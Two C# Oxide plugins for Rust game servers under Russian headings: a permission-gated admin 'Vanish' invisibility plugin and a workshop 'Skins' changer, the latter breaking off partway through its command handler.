###ПЛАГИН НА ВАНИШ(НЕВИДИМОСТЬ)###

using Network;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Libraries.Covalence;
using Oxide.Game.Rust.Cui;
using Rust;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Vanish", "ATOMIC", "1.0.0")]
    [Description("Allows players with permission to become invisible")]
    public class Vanish : CovalencePlugin
    {
        static Vanish vanish;
        #region Configuration
        private readonly List<BasePlayer> _hiddenPlayers = new List<BasePlayer>();
        private readonly List<BasePlayer> _hiddenOffline = new List<BasePlayer>();
        private static List<string> _registeredhooks = new List<string> { "CanUseLockedEntity", "OnPlayerDisconnected", "OnEntityTakeDamage" };
        private static readonly DamageTypeList _EmptyDmgList = new DamageTypeList();
        CuiElementContainer cachedVanishUI = null;

        private Configuration config;

        public class Configuration
        {
            [JsonProperty("NoClip on Vanish (runs noclip command)")]
            public bool NoClipOnVanish = true;

            [JsonProperty("Use OnEntityTakeDamage hook (Set to true to enable use of vanish.damage perm. Set to false for better performance)")]
            public bool UseOnEntityTakeDamage = false;

            [JsonProperty("Use CanUseLockedEntity hook (Allows vanished players with the perm vanish.unlock to bypass locks. Set to false for better performance)")]
            public bool UseCanUseLockedEntity = true;

            [JsonProperty("Hide an invisible players body under the terrain after disconnect")]
            public bool HideOnDisconnect = true;

            [JsonProperty("If a player was vanished on disconnection keep them vanished on reconnect")]
            public bool HideOnReconnect = true;

            [JsonProperty("Turn off fly hack detection for players in vanish")]
            public bool AntiHack = true;

            [JsonProperty("Disable metabolism in vanish")]
            public bool Metabolism = true;

            [JsonProperty("Reset hydration and health on un-vanishing (resets to pre-vanished state)")]
            public bool MetabolismReset = true;

            [JsonProperty("Enable vanishing and reappearing sound effects")]
            public bool EnableSound = true;

            [JsonProperty("Make sound effects public")]
            public bool PublicSound = false;

            [JsonProperty("Enable chat notifications")]
            public bool EnableNotifications = true;

            [JsonProperty("Sound effect to use when vanishing")]
            public string VanishSoundEffect = "assets/prefabs/npc/patrol helicopter/effects/rocket_fire.prefab";

            [JsonProperty("Sound effect to use when reappearing")]
            public string ReappearSoundEffect = "assets/prefabs/npc/patrol helicopter/effects/rocket_fire.prefab";

            [JsonProperty("Enable GUI")]
            public bool EnableGUI = true;

            [JsonProperty("Icon URL (.png or .jpg)")]
            public string ImageUrlIcon = "http://i.imgur.com/Gr5G3YI.png";

            [JsonProperty("Image Color")]
            public string ImageColor = "1 1 1 0.3";

            [JsonProperty("Image AnchorMin")]
            public string ImageAnchorMin = "0.175 0.017";

            [JsonProperty("Image AnchorMax")]
            public string ImageAnchorMax = "0.22 0.08";

            public string ToJson() => JsonConvert.SerializeObject(this);

            public Dictionary<string, object> ToDictionary() => JsonConvert.DeserializeObject<Dictionary<string, object>>(ToJson());
        }

        protected override void LoadDefaultConfig() => config = new Configuration();

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<Configuration>();
                if (config == null)
                {
                    throw new JsonException();
                }

                if (!config.ToDictionary().Keys.SequenceEqual(Config.ToDictionary(x => x.Key, x => x.Value).Keys))
                {
                    LogWarning("Configuration appears to be outdated; updating and saving");
                    SaveConfig();
                }
            }
            catch
            {
                LogWarning($"Configuration file {Name}.json is invalid; using defaults");
                LoadDefaultConfig();
            }
        }

        protected override void SaveConfig()
        {
            LogWarning($"Configuration changes saved to {Name}.json");
            Config.WriteObject(config, true);
        }

        #endregion Configuration

        #region Localization

        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["VanishCommand"] = "V",
                ["Vanished"] = "Vanish: <color=orange> Enabled </color>",
                ["Reappear"] = "Vanish: <color=orange> Disabled </color>",
                ["NoPerms"] = "You do not have permission to do this",
                ["PermanentVanish"] = "You are in a permanent vanish mode",

            }, this);
        }

        #endregion Localization

        #region Initialization

        private const string permallow = "vanish.allow";
        private const string permunlock = "vanish.unlock";
        private const string permdamage = "vanish.damage";
        private const string permavanish = "vanish.permanent";

        private void Init()
        {
            vanish = this;
            cachedVanishUI = CreateVanishUI();

            // Register univeral chat/console commands
            AddLocalizedCommand(nameof(VanishCommand));

            // Register permissions for commands
            permission.RegisterPermission(permallow, this);
            permission.RegisterPermission(permunlock, this);
            permission.RegisterPermission(permdamage, this);
            permission.RegisterPermission(permavanish, this);

            //Unsubscribe from hooks
            UnSubscribeFromHooks();

            if (!config.UseOnEntityTakeDamage)
            {
                _registeredhooks.Remove("OnEntityTakeDamage");
            }

            if (!config.UseCanUseLockedEntity)
            {
                _registeredhooks.Remove("CanUseLockedEntity");
            }

            foreach (var player in BasePlayer.activePlayerList)
            {
                if (!HasPerm(player.UserIDString, permavanish) || IsInvisible(player)) continue;
                Disappear(player);
            }
        }

        private void Unload()
        {
            foreach (var player in _hiddenPlayers.ToList())
            {
                if (player == null) continue;
                Reappear(player);
            }

            foreach (var player in BasePlayer.activePlayerList)
            {
                VanishPositionUpdate t;
                if (!player.TryGetComponent<VanishPositionUpdate>(out t)) continue;
                UnityEngine.Object.Destroy(t);
            }
        }

        #endregion Initialization

        #region Commands
        private void VanishCommand(IPlayer iplayer, string command, string[] args)
        {
            BasePlayer player = (BasePlayer)iplayer.Object;
            if (player == null) return;
            if (!HasPerm(player.UserIDString, permallow))
            {
                if (config.EnableNotifications) Message(player.IPlayer, "NoPerms");
                return;
            }
            if (HasPerm(player.UserIDString, permavanish))
            {
                if (config.EnableNotifications) Message(player.IPlayer, "PermanentVanish");
                return;
            }
            if (IsInvisible(player)) Reappear(player);
            else Disappear(player);
        }

        private void Reappear(BasePlayer player)
        {
            if (Interface.CallHook("OnVanishReappear", player) != null) return;
            if (config.AntiHack) player.ResetAntiHack();

            player.syncPosition = true;
            UnityEngine.Object.Destroy(player.GetComponent<VanishPositionUpdate>());


            //metabolism
            if (config.Metabolism)
            {
                player.metabolism.temperature.min = -100;
                player.metabolism.temperature.max = 100;
                player.metabolism.radiation_poison.max = 500;
                player.metabolism.oxygen.min = 0;
                player.metabolism.calories.min = 0;
                player.metabolism.wetness.max = 1;
            }
            if (config.MetabolismReset)
            {
                MetabolismValues value;

                if (_storedMetabolism.TryGetValue(player, out value))
                {
                    player.health = value.health;
                    player.metabolism.hydration.value = value.hydration;
                }
                _storedMetabolism.Remove(player);
            }

            player.metabolism.isDirty = true;
            player.metabolism.SendChangesToClient();

            player._limitedNetworking = false;

            player.playerCollider.enabled = true;
            _hiddenPlayers.Remove(player);
            player.UpdateNetworkGroup();
            player.SendNetworkUpdate();
            player.GetHeldEntity()?.SendNetworkUpdate();

            //Un-Mute Player Effects
            player.drownEffect.guid = "28ad47c8e6d313742a7a2740674a25b5";
            player.fallDamageEffect.guid = "ca14ed027d5924003b1c5d9e523a5fce";

            if (_hiddenPlayers.Count == 0) UnSubscribeFromHooks();

            if (config.EnableSound)
            {
                if (config.PublicSound)
                {
                    Effect.server.Run(config.ReappearSoundEffect, player.transform.position);
                }
                else
                {
                    SendEffect(player, config.ReappearSoundEffect);
                }
            }
            CuiHelper.DestroyUi(player, "VanishUI");

            if (config.NoClipOnVanish && player.IsFlying) player.SendConsoleCommand("noclip");

            if (config.EnableNotifications) Message(player.IPlayer, "Reappear");
        }

        private class MetabolismValues
        {
            public float health;
            public float hydration;
        }

        private Dictionary<BasePlayer, MetabolismValues> _storedMetabolism = new Dictionary<BasePlayer, MetabolismValues>();
        private void Disappear(BasePlayer player)
        {
            if (Interface.CallHook("OnVanishDisappear", player) != null) return;
            if (config.AntiHack) player.PauseFlyHackDetection(9000000f);

            player.gameObject.AddComponent<VanishPositionUpdate>();

            //metabolism
            if (config.Metabolism)
            {
                player.metabolism.temperature.min = 20;
                player.metabolism.temperature.max = 20;
                player.metabolism.radiation_poison.max = 0;
                player.metabolism.oxygen.min = 1;
                player.metabolism.wetness.max = 0;
                player.metabolism.calories.min = player.metabolism.calories.value;
                player.metabolism.isDirty = true;
                player.metabolism.SendChangesToClient();
            }
            if (config.MetabolismReset)
                _storedMetabolism[player] = new MetabolismValues() { health = player.health, hydration = player.metabolism.hydration.value };

            var connections = Net.sv.connections.Where(con => con.connected && con.isAuthenticated && con.player is BasePlayer && con.player != player).ToList();
            player.OnNetworkSubscribersLeave(connections);
            player.DisablePlayerCollider();
            player.syncPosition = false;

            player._limitedNetworking = true;

            //Mute Player Effects
            player.fallDamageEffect = new GameObjectRef();
            player.drownEffect = new GameObjectRef();

            if (_hiddenPlayers.Count == 0) SubscribeToHooks();
            _hiddenPlayers.Add(player);

            if (config.EnableSound)
            {
                if (config.PublicSound)
                {
                    Effect.server.Run(config.VanishSoundEffect, player.transform.position);
                }
                else
                {
                    SendEffect(player, config.VanishSoundEffect);
                }
            }

            if (config.NoClipOnVanish && !player.IsFlying && !player.isMounted) player.SendConsoleCommand("noclip");

            if (config.EnableGUI)
            {
                CuiHelper.AddUi(player, cachedVanishUI);
            }

            if (config.EnableNotifications) Message(player.IPlayer, "Vanished");
        }

        #endregion Commands

        #region Hooks
        private void OnPlayerConnected(BasePlayer player)
        {
            if (_hiddenOffline.Contains(player))
            {
                _hiddenOffline.Remove(player);
                if (HasPerm(player.UserIDString, permallow))
                    Disappear(player);
                return;
            }
            if (HasPerm(player.UserIDString, permavanish))
            {
                Disappear(player);
            }
        }

        private object CanUseLockedEntity(BasePlayer player, BaseLock baseLock)
        {
            if (player.limitNetworking)
            {
                if (HasPerm(player.UserIDString, permunlock)) return true;
                if (config.EnableNotifications) Message(player.IPlayer, "NoPerms");
            }
            return null;
        }

        private object OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            var attacker = info?.InitiatorPlayer;
            var victim = entity?.ToPlayer();
            if (!IsInvisible(victim) && !IsInvisible(attacker)) return null;
            if (IsInvisible(attacker) && HasPerm(attacker.UserIDString, permdamage)) return null;
            if (info != null)
            {
                info.damageTypes = _EmptyDmgList;
                info.HitMaterial = 0;
                info.PointStart = Vector3.zero;
                info.HitEntity = null;
            }
            return true;
        }

        private void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            if (!IsInvisible(player)) return;

            Reappear(player);

            if (_hiddenPlayers.Count == 0) UnSubscribeFromHooks();

            if (config.HideOnDisconnect)
            {
                var pos = player.transform.position;
                var underTerrainPos = new Vector3(pos.x, TerrainMeta.HeightMap.GetHeight(pos) - 5, pos.z);
                player.Teleport(underTerrainPos);
                player.DisablePlayerCollider();
                player.limitNetworking = true;
            }

            if (config.HideOnReconnect)
                _hiddenOffline.Add(player);

            CuiHelper.DestroyUi(player, "VanishUI");
            CuiHelper.DestroyUi(player, "VanishColliderUI");
        }
        #endregion Hooks

        #region GUI
        private CuiElementContainer CreateVanishUI()
        {
            CuiElementContainer elements = new CuiElementContainer();
            string panel = elements.Add(new CuiPanel
            {
                Image = { Color = "0.5 0.5 0.5 0.0" },
                RectTransform = { AnchorMin = config.ImageAnchorMin, AnchorMax = config.ImageAnchorMax }
            }, "Hud.Menu", "VanishUI");
            elements.Add(new CuiElement
            {
                Parent = panel,
                Components =
                {
                    new CuiRawImageComponent {Color = config.ImageColor, Url = config.ImageUrlIcon},
                    new CuiRectTransformComponent {AnchorMin = "0 0", AnchorMax = "1 1"}
                }
            });
            return elements;
        }

        #endregion GUI

        #region Monobehaviour
        public class VanishPositionUpdate : FacepunchBehaviour
        {
            private BasePlayer player;
            public bool collider;
            GameObject child;
            SphereCollider col;
            private void Awake()
            {
                player = GetComponent<BasePlayer>();
                InvokeRepeating("UpdatePos", 1f, 5f);
                player.transform.localScale = Vector3.zero;
                child = gameObject.CreateChild();
                col = child.AddComponent<SphereCollider>();
                child.layer = (int)Layer.Reserved1;
                child.transform.localScale = Vector3.zero;
                col.isTrigger = true;
                BaseEntity.Query.Server.RemovePlayer(player);
            }

            private void UpdatePos()
            {
                using (TimeWarning.New("UpdateVanishGroup"))
                    player.net.UpdateGroups(player.transform.position);
                //until a collider hook is added
                if (player.playerCollider.enabled)
                    player.DisablePlayerCollider();
                player.transform.localScale = Vector3.zero;
            }

            void OnTriggerEnter(Collider col)
            {
                TriggerParent triggerParent = col.GetComponentInParent<TriggerParent>();
                if (triggerParent == null) return;
                triggerParent.OnEntityEnter(player);
            }

            void OnTriggerExit(Collider col)
            {
                TriggerParent triggerParent = col.GetComponentInParent<TriggerParent>();
                if (triggerParent == null) return;
                triggerParent.OnEntityLeave(player);
            }

            private void OnDestroy()
            {
                Destroy(col);
                Destroy(child);
                BaseEntity.Query.Server.AddPlayer(player);
                player.transform.localScale = new Vector3(1, 1, 1);
                CancelInvoke();
                player = null;
            }
        }

        #endregion Monobehaviour

        #region Helpers

        private void AddLocalizedCommand(string command)
        {
            foreach (string language in lang.GetLanguages(this))
            {
                Dictionary<string, string> messages = lang.GetMessages(language, this);
                foreach (KeyValuePair<string, string> message in messages)
                {
                    if (!message.Key.Equals(command)) continue;

                    if (string.IsNullOrEmpty(message.Value)) continue;

                    AddCovalenceCommand(message.Value, command);
                }
            }
        }

        private bool HasPerm(string id, string perm) => permission.UserHasPermission(id, perm);

        private string GetLang(string langKey, string playerId = null, params object[] args) => string.Format(lang.GetMessage(langKey, this, playerId), args);

        private void Message(IPlayer player, string langKey, params object[] args)
        {
            if (player.IsConnected) player.Message(GetLang(langKey, player.Id, args));
        }

        private bool IsInvisible(BasePlayer player) => player != null && _hiddenPlayers.Contains(player);

        private void UnSubscribeFromHooks()
        {
            foreach (var hook in _registeredhooks)
                Unsubscribe(hook);
        }

        private void SubscribeToHooks()
        {
            foreach (var hook in _registeredhooks)
                Subscribe(hook);
        }

        private void SendEffect(BasePlayer player, string sound)
        {
            var effect = new Effect(sound, player, 0, Vector3.zero, Vector3.forward);
            EffectNetwork.Send(effect, player.net.connection);
        }

        #endregion Helpers

        #region Public Helpers
        public void _Disappear(BasePlayer basePlayer) => Disappear(basePlayer);
        public void _Reappear(BasePlayer basePlayer) => Reappear(basePlayer);
        public bool _IsInvisible(BasePlayer basePlayer) => IsInvisible(basePlayer);
        #endregion
    }
}

###ПЛАГИН НА СКИНЫ###

//#define DEBUG

using System;
using System.Collections.Generic;
using System.Linq;
using Facepunch;
using Network;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using ProtoBuf;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Skins", "misticos", "2.2.2")]
    [Description("Change workshop skins of items easily")]
    class Skins : RustPlugin
    {
        #region Variables

        private static Skins _ins;

        private Dictionary<ulong, ContainerController> _controllers = new Dictionary<ulong, ContainerController>();
        private Dictionary<uint, ContainerController> _controllersPerContainer =
            new Dictionary<uint, ContainerController>();

        private HashSet<uint> _itemAttachmentContainers = new HashSet<uint>();

        private const string PermissionUse = "skins.use";
        private const string PermissionAdmin = "skins.admin";

        private const string CommandDefault = "skins.skin";

        #endregion

        #region Configuration

        private Configuration _config;

        private class Configuration
        {
            [JsonProperty(PropertyName = "Commands")]
            public string[] Commands = {"skin", "skins"};

            [JsonProperty(PropertyName = "Skins", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public List<SkinItem> Skins = new List<SkinItem> {new SkinItem()};

            [JsonIgnore]
            public Dictionary<string, List<SkinItem>> IndexedSkins = new Dictionary<string, List<SkinItem>>();

            [JsonProperty(PropertyName = "Container Panel Name")]
            public string Panel = "generic";

            [JsonProperty(PropertyName = "Container Capacity")]
            public int Capacity = 36;

            [JsonProperty(PropertyName = "UI")]
            public UIConfiguration UI = new UIConfiguration();

            public class SkinItem
            {
                [JsonProperty(PropertyName = "Item Shortname")]
                // ReSharper disable once MemberCanBePrivate.Local
                public string Shortname = "shortname";

                [JsonProperty(PropertyName = "Permission")]
                public string Permission = "";

                [JsonProperty(PropertyName = "Skins", ObjectCreationHandling = ObjectCreationHandling.Replace)]
                public List<ulong> Skins = new List<ulong> {0};

                public static IEnumerable<SkinItem> Find(IPlayer player, string shortname)
                {
                    List<SkinItem> items;
                    if (!_ins._config.IndexedSkins.TryGetValue(shortname, out items))
                        yield break;

                    foreach (var item in items)
                    {
                        if (!item.CanUse(player))
                            continue;

                        yield return item;
                    }
                }

                public bool CanUse(IPlayer player) => player == null ||
                                                      string.IsNullOrEmpty(Permission) ||
                                                      player.HasPermission(Permission);
            }

            public class UIConfiguration
            {
                [JsonProperty(PropertyName = "Background Color")]
                public string BackgroundColor = "0.18 0.28 0.36";

                [JsonProperty(PropertyName = "Background Anchors")]
                public Anchors BackgroundAnchors = new Anchors
                    {AnchorMinX = "1.0", AnchorMinY = "1.0", AnchorMaxX = "1.0", AnchorMaxY = "1.0"};

                [JsonProperty(PropertyName = "Background Offsets")]
                public Offsets BackgroundOffsets = new Offsets
                    {OffsetMinX = "-300", OffsetMinY = "-100", OffsetMaxX = "0", OffsetMaxY = "0"};

                [JsonProperty(PropertyName = "Left Button Text")]
                public string LeftText = "<size=36><</size>";

                [JsonProperty(PropertyName = "Left Button Color")]
                public string LeftColor = "0.11 0.51 0.83";

                [JsonProperty(PropertyName = "Left Button Anchors")]
                public Anchors LeftAnchors = new Anchors
                    {AnchorMinX = "0.025", AnchorMinY = "0.05", AnchorMaxX = "0.325", AnchorMaxY = "0.95"};

                [JsonProperty(PropertyName = "Center Button Text")]
                public string CenterText = "<size=36>Page: {page}</size>";

                [JsonProperty(PropertyName = "Center Button Color")]
                public string CenterColor = "0.11 0.51 0.83";

                [JsonProperty(PropertyName = "Center Button Anchors")]
                public Anchors CenterAnchors = new Anchors
                    {AnchorMinX = "0.350", AnchorMinY = "0.05", AnchorMaxX = "0.650", AnchorMaxY = "0.95"};

                [JsonProperty(PropertyName = "Right Button Text")]
                public string RightText = "<size=36>></size>";

                [JsonProperty(PropertyName = "Right Button Color")]
                public string RightColor = "0.11 0.51 0.83";

                [JsonProperty(PropertyName = "Right Button Anchors")]
                public Anchors RightAnchors = new Anchors
                    {AnchorMinX = "0.675", AnchorMinY = "0.05", AnchorMaxX = "0.975", AnchorMaxY = "0.95"};

                [JsonIgnore]
                public string ParsedUI;

                [JsonIgnore]
                public int IndexPagePrevious, IndexPageCurrent, IndexPageNext;

                public class Anchors
                {
                    [JsonProperty(PropertyName = "Anchor Min X")]
                    public string AnchorMinX = "0.0";

                    [JsonProperty(PropertyName = "Anchor Min Y")]
                    public string AnchorMinY = "0.0";

                    [JsonProperty(PropertyName = "Anchor Max X")]
                    public string AnchorMaxX = "1.0";

                    [JsonProperty(PropertyName = "Anchor Max Y")]
                    public string AnchorMaxY = "1.0";

                    [JsonIgnore]
                    public string AnchorMin => $"{AnchorMinX} {AnchorMinY}";

                    [JsonIgnore]
                    public string AnchorMax => $"{AnchorMaxX} {AnchorMaxY}";
                }

                public class Offsets
                {
                    [JsonProperty(PropertyName = "Offset Min X")]
                    public string OffsetMinX = "0";

                    [JsonProperty(PropertyName = "Offset Min Y")]
                    public string OffsetMinY = "0";

                    [JsonProperty(PropertyName = "Offset Max X")]
                    public string OffsetMaxX = "100";

                    [JsonProperty(PropertyName = "Offset Max Y")]
                    public string OffsetMaxY = "100";

                    [JsonIgnore]
                    public string OffsetMin => $"{OffsetMinX} {OffsetMinY}";

                    [JsonIgnore]
                    public string OffsetMax => $"{OffsetMaxX} {OffsetMaxY}";
                }
            }

            public void IndexSkins()
            {
                IndexedSkins.Clear();

                foreach (var item in Skins)
                {
                    if (!string.IsNullOrEmpty(item.Permission) && !_ins.permission.PermissionExists(item.Permission))
                        _ins.permission.RegisterPermission(item.Permission, _ins);

                    List<SkinItem> items;
                    if (!IndexedSkins.TryGetValue(item.Shortname, out items))
                        items = IndexedSkins[item.Shortname] = new List<SkinItem>();

                    items.Add(item);
                }
            }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                _config = Config.ReadObject<Configuration>();
                if (_config == null) throw new Exception();
                SaveConfig();
                
                _config.IndexSkins();
            }
            catch
            {
                PrintError("Your configuration file contains an error. Using default configuration values.");
                LoadDefaultConfig();
            }
        }

        protected override void SaveConfig() => Config.WriteObject(_config);

        protected override void LoadDefaultConfig() => _config = new Configuration();

        #endregion

        #region Hooks

        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                {"Not Allowed", "You don't have permission to use this command."},
                {"Cannot Use", "I'm sorry, you cannot use that right now."},
                {
                    "Help", "Command usage:\n" +
                            "skin show - Show skins.\n" +
                            "skin get - Get Skin ID of the item.\n" +
                            "skin purgecache (shortname) - Purge skins cache by shortname (or empty to purge all)"
                },
                {
                    "Admin Help", "Admin command usage:\n" +
                                  "skin remove (Shortname) (Skin ID) [Permission] - Remove a skin.\n" +
                                  "skin add (Shortname) (Skin ID) [Permission] - Add a skin."
                },
                {"Skin Get Format", "{shortname}'s skin: {id}."},
                {"Skin Get No Item", "Please, hold the needed item."},
                {"Incorrect Skin", "You have entered an incorrect skin."},
                {"Skin Already Exists", "This skin already exists on this item."},
                {"Skin Does Not Exist", "This skin does not exist."},
                {"Skin Added", "Skin was successfully added."},
                {"Skin Removed", "Skin was removed."}
            }, this);
        }

        private void Init()
        {
            _ins = this;

            permission.RegisterPermission(PermissionUse, this);
            permission.RegisterPermission(PermissionAdmin, this);

            GenerateUI();
        }

        private void GenerateUI()
        {
            const string pagePrevious = "{pagePrevious}";
            const string pageCurrent = "{page}";
            const string pageNext = "{pageNext}";

            var elements = new CuiElementContainer();

            var background = new CuiElement
            {
                Name = "Skins.Background",
                Parent = "Overlay",
                Components =
                {
                    new CuiImageComponent
                    {
                        Color = _ins._config.UI.BackgroundColor
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = _ins._config.UI.BackgroundAnchors.AnchorMin,
                        AnchorMax = _ins._config.UI.BackgroundAnchors.AnchorMax,
                        OffsetMin = _ins._config.UI.BackgroundOffsets.OffsetMin,
                        OffsetMax = _ins._config.UI.BackgroundOffsets.OffsetMax
                    }
                },
                FadeOut = 0.5f
            };

            var left = new CuiElement
            {
                Name = "Skins.Left",
                Parent = background.Name,
                Components =
                {
                    new CuiButtonComponent
                    {
                        Close = background.Name,
                        Command = $"{CommandDefault} _tech-update {pagePrevious}",
                        Color = _ins._config.UI.LeftColor
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = _ins._config.UI.LeftAnchors.AnchorMin,
                        AnchorMax = _ins._config.UI.LeftAnchors.AnchorMax
                    }
                },
                FadeOut = 0.5f
            };

            var leftText = new CuiElement
            {
                Name = "Skins.Left.Text",
                Parent = left.Name,
                Components =
                {
                    new CuiTextComponent
                    {
                        Text = _ins._config.UI.LeftText,
                        Align = TextAnchor.MiddleCenter
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "0 0",
                        AnchorMax = "1 1"
                    }
                },
                FadeOut = 0.5f
            };

            var center = new CuiElement
            {
                Name = "Skins.Center",
                Parent = background.Name,
                Components =
                {
                    new CuiImageComponent
                    {
                        Color = _ins._config.UI.CenterColor
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = _ins._config.UI.CenterAnchors.AnchorMin,
                        AnchorMax = _ins._config.UI.CenterAnchors.AnchorMax
                    }
                },
                FadeOut = 0.5f
            };

            var centerText = new CuiElement
            {
                Name = "Skins.Center.Text",
                Parent = center.Name,
                Components =
                {
                    new CuiTextComponent
                    {
                        Text = _ins._config.UI.CenterText,
                        Align = TextAnchor.MiddleCenter
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "0 0",
                        AnchorMax = "1 1"
                    }
                },
                FadeOut = 0.5f
            };

            var right = new CuiElement
            {
                Name = "Skins.Right",
                Parent = background.Name,
                Components =
                {
                    new CuiButtonComponent
                    {
                        Close = background.Name,
                        Command = $"{CommandDefault} _tech-update {pageNext}",
                        Color = _ins._config.UI.RightColor
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = _ins._config.UI.RightAnchors.AnchorMin,
                        AnchorMax = _ins._config.UI.RightAnchors.AnchorMax
                    }
                },
                FadeOut = 0.5f
            };

            var rightText = new CuiElement
            {
                Name = "Skins.Right.Text",
                Parent = right.Name,
                Components =
                {
                    new CuiTextComponent
                    {
                        Text = _ins._config.UI.RightText,
                        Align = TextAnchor.MiddleCenter
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "0 0",
                        AnchorMax = "1 1"
                    }
                },
                FadeOut = 0.5f
            };

            elements.Add(background);
            elements.Add(left);
            elements.Add(leftText);
            elements.Add(center);
            elements.Add(centerText);
            elements.Add(right);
            elements.Add(rightText);

            _config.UI.ParsedUI = elements.ToJson();

            _config.UI.IndexPagePrevious = _config.UI.ParsedUI.LastIndexOf(pagePrevious, StringComparison.Ordinal);
            _config.UI.ParsedUI = _config.UI.ParsedUI.Remove(_config.UI.IndexPagePrevious, pagePrevious.Length);
            
            _config.UI.IndexPageCurrent = _config.UI.ParsedUI.LastIndexOf(pageCurrent, StringComparison.Ordinal);
            _config.UI.ParsedUI = _config.UI.ParsedUI.Remove(_config.UI.IndexPageCurrent, pageCurrent.Length);
            
            _config.UI.IndexPageNext = _config.UI.ParsedUI.LastIndexOf(pageNext, StringComparison.Ordinal);
            _config.UI.ParsedUI = _config.UI.ParsedUI.Remove(_config.UI.IndexPageNext, pageNext.Length);
        }

        private void OnServerInitialized()
        {
            foreach (var shortname in _config.IndexedSkins.Keys)
            {
                if (ItemManager.FindItemDefinition(shortname) != null)
                    continue;
                
                PrintWarning($"Item with shortname \"{shortname}\" does not exist. Please review your Skins configuration.");
            }
            
            for (var i = 0; i < BasePlayer.activePlayerList.Count; i++)
            {
                OnPlayerConnected(BasePlayer.activePlayerList[i]);
            }

            AddCovalenceCommand(_config.Commands, nameof(CommandSkin));
            AddCovalenceCommand(CommandDefault, nameof(CommandSkin));
        }

        private void Unload()
        {
            foreach (var controller in _controllers)
                controller.Value.Destroy();

            _ins = null;
        }

        private void OnPlayerConnected(BasePlayer player)
        {
            if (_controllers.ContainsKey(player.userID))
                return;

            _controllers.Add(player.userID, new ContainerController(player)); // lol
        }

        private void OnPlayerDisconnected(BasePlayer player)
        {
            ContainerController container;
            if (!_controllers.Remove(player.userID, out container))
                return;
            
            container.Destroy();
        }

        #region Working With Containers

        private void OnItemSplit(Item item, int amount)
        {
            if (item.parentItem != null || item.parent == null)
                return;

            ContainerController container;
            if (!_controllersPerContainer.TryGetValue(item.parent.uid, out container))
                return;

#if DEBUG
            Puts($"OnItemSplit: {item.info.shortname} ({item.amount}x, slot {item.position}); {amount}x");
#endif

            var main = container.Container.GetSlot(0);
            if (main == null)
            {
#if DEBUG
                Puts("Main item is null");
#endif
                return;
            }

            NextFrame(() =>
            {
                if (main.uid != item.uid) // Ignore main item because it's amount will be changed
                    main.amount -= amount;

                container.UpdateContent(0);
            });
        }

        private void OnItemAddedToContainer(ItemContainer itemContainer, Item item)
        {
            if (item.parentItem != null)
                return;

            var player = itemContainer.GetOwnerPlayer();
            if (player != null)
                return;

            ContainerController container;
            if (!_controllersPerContainer.TryGetValue(itemContainer.uid, out container))
                return;

#if DEBUG
            Puts($"OnItemAddedToContainer: {item.info.shortname} (slot {item.position})");
#endif

            if (itemContainer.itemList.Count != 1)
            {
                item.position = -1;
                item.parent.itemList.Remove(item);
                item.parent = null;
                container.GiveItemBack();
                container.Clear();
                item.parent = container.Container;
                item.parent.itemList.Add(item);
            }

            item.position = 0;
            container.StoreContent(item);
            container.UpdateContent(0);
        }

        private void OnItemRemovedFromContainer(ItemContainer itemContainer, Item item)
        {
            if (item.parentItem != null)
                return;

            var player = itemContainer.GetOwnerPlayer();
            if (player != null)
                return;

            ContainerController container;
            if (!_controllersPerContainer.TryGetValue(itemContainer.uid, out container))
                return;

#if DEBUG
            Puts($"OnItemRemovedFromContainer: {item.info.shortname} (slot {item.position})");
#endif

            container.OnItemTaken(item);

            Interface.CallHook("OnItemSkinChanged", player, item);

            container.Clear();
        }

        private void OnPlayerLootEnd(PlayerLoot loot)
        {
            var player = loot.gameObject.GetComponent<BasePlayer>();
            if (player != loot.entitySource)
                return;

#if DEBUG
            Puts("OnLootEntityEnd: Closing container");
#endif

            ContainerController container;
            if (!_controllers.TryGetValue(player.userID, out container))
                return;
            
            container.Close();
        }

        private object CanLootPlayer(BasePlayer looter, BasePlayer target)
        {
            if (looter != target)
                return null;

            ContainerController container;
            if (!_controllers.TryGetValue(looter.userID, out container) || !container.IsOpened)
                return null;

            return true;
        }

        private object CanMoveItem(Item item, PlayerInventory playerLoot, uint targetContainerId, int slot, int amount)
        {
            if (_itemAttachmentContainers.Contains(targetContainerId))
            {
#if DEBUG
                Puts("// CanMoveItem: Preventing attachments abuse");
#endif
                return false;
            }

            ContainerController containerFrom, containerTo;
            if (!_controllersPerContainer.TryGetValue(targetContainerId, out containerTo) &&
                (item.parent == null || !_controllersPerContainer.TryGetValue(item.parent.uid, out containerFrom)))
                return null;

#if DEBUG
            Puts(
                $"CanMoveItem: {item.info.shortname} ({item.amount}) from {item.parent?.uid ?? 0} to {targetContainerId} in {slot} ({amount})");
#endif

            if (item.parent?.uid == targetContainerId)
            {
#if DEBUG
                Puts("// CanMoveItem: Preventing same containers");
#endif

                return false;
            }

            return CanMoveItemTo(containerTo, item, slot, amount);
        }

        #region Minor helpers

        private object CanMoveItemTo(ContainerController controller, Item item, int slot, int amount)
        {
            var targetItem = controller?.Container?.GetSlot(slot);
            if (targetItem != null)
            {
                // Give target item back
                controller.GiveItemBack(targetItem);
                controller.Clear();
            }

            return null;
        }

        #endregion

        #endregion

        #endregion

        #region Commands

        private void CommandSkin(IPlayer player, string command, string[] args)
        {
            if (!CanUse(player))
            {
#if DEBUG
                Puts("Not allowed");
#endif

                player.Reply(GetMsg("Not Allowed", player.Id));
                return;
            }
            
